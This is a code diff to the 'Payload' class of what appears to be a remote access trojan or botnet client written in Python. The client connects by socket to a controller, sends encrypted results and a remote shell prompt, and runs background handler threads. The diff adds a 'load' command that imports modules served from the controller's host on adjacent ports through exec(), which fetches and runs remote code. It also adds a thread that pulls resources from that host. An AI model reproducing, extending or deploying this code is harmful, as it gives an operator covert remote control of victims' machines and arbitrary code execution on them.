@@ -60,10 +60,8 @@ def threaded(function):
     return _threaded
 
 # main
-
 _abort = False
 _debug = True
-
 
 class Payload():
     """ 
@@ -110,17 +108,10 @@ class Payload():
             raise ValueError('invalid port number')
         else:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
+            sock.connect((host, int(port)))
             sock.setblocking(True)
             self.flags.connection.set()
             return sock
-
-    def _get_remote(self, base_url=None):
-        if self.flags.connection.is_set():
-            if not base_url:
-                host, port = self.connection.getpeername()
-                base_url = 'http://{}:{}'.format(host, port + 1)
-            self.resources = self._get_resources(target=self.remote, base_url=base_url)
 
     def _get_key(self, conn):
         if isinstance(conn, socket.socket):
@@ -172,11 +163,19 @@ class Payload():
                     target.append(resource)
 
     @threaded
+    def _get_resource_handler(self):
+        if self.flags.connection.is_set():
+            host, port = self.connection.getpeername()
+            base_url = 'http://{}:{}'.format(host, port + 1)
+            return self._get_resources(target=self.remote, base_url=base_url)
+
+    @threaded
     def _get_prompt_handler(self):
+        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
         while True:
             try:
                 self.flags.prompt.wait()
-                self.send_task(session=self.info.get('uid'), task='prompt', result='[ %d @ {} ]> '.format(os.getcwd()))
+                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
                 self.flags.prompt.clear()
                 if globals()['_abort']:
                     break
@@ -405,6 +404,18 @@ class Payload():
         except Exception as e:
             __logger__.error(e)
         return self.mode.usage
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
+    def load(self, module):
+        host, port = self.connection.getpeername()
+        base_url_1 = 'http://{}:{}'.format(host, port + 1)
+        base_url_2 = 'http://{}:{}'.format(host, port + 2)
+        with globals()['remote_repo'](self.remote['modules'], base_url_1):
+            with globals()['remote_repo'](self.remote['packages'], base_url_2):
+                try:
+                    exec("import {}".format(module), globals())
+                except Exception as e:
+                    return "{} error: {}".format(self.load.func_name, str(e))                    
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self):
@@ -955,7 +966,7 @@ class Payload():
         if not 'session' in task:
             task['session'] = self.info.get('uid')
         if self.flags.connection.wait(timeout=1.0):
-            data = globals()['encrypt_aes'](json.dumps(task))
+            data = globals()['encrypt_aes'](json.dumps(task), self.key)
             msg  = struct.pack('!L', len(data)) + data
             self.connection.sendall(msg)
             return True
@@ -988,7 +999,7 @@ class Payload():
 
         """
         try:
-            for target in ('prompt_handler','thread_handler'):
+            for target in ('resource_handler','prompt_handler','thread_handler'):
                 if not bool(target in self.handlers and self.handlers[target].is_alive()):
                     self.handlers[target] = getattr(self, '_get_{}'.format(target))()
             while True:
@@ -1011,4 +1022,3 @@ class Payload():
                     break
         except Exception as e:
             __logger__.error("{} error: {}".format(self.run.func_name, str(e)))
-
